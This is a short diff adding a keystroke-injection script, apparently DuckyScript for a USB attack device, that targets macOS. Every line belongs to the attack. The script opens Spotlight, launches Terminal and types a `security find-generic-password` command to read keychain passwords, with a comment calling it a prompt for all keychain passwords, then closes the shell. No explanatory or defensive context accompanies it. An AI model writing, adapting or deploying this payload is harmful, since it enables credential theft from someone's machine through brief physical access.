@@ -1,0 +1,11 @@
+DELAY 1500
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 1500
+STRING security find-generic-password -wa ""  # Prompt for all keychain passwords
+ENTER
+DELAY 500
+STRING exit
+ENTER
